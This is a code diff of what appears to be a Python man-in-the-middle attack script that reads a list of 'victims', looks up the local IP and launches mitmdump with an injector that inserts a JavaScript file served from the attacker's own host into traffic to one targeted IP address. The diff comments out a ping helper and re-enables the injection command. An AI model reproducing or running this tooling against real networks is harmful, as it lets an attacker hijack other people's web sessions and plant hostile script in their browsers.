@@ -17,6 +17,8 @@ victims = [line.rstrip('\n') for line in open("victims.txt")]
 print("victims:")
 print(victims)
 
+
+"""
 def run(command):
     process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
     while True:
@@ -27,9 +29,9 @@ def run(command):
      
 for path in run("ping -c 3 "+gateway):
     print(path)
-#cmd = subprocess.Popen('ping ' + gateway, shell=True, stdout=subprocess.PIPE, universal_newlines=True).communicate()[0]
-#print(cmd)
+
 """
+
 def get_ip_address(ifname):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     return socket.inet_ntoa(fcntl.ioctl(
@@ -63,4 +65,4 @@ site = "212\.92\.30\.199"
 
 # start the mitmproxy
 os.system("mitmdump -v --ignore '^(?!"+ site +")' -s 'injector.py http://" + attacker_ip + ":8001/script.js' -T") 
-"""
+
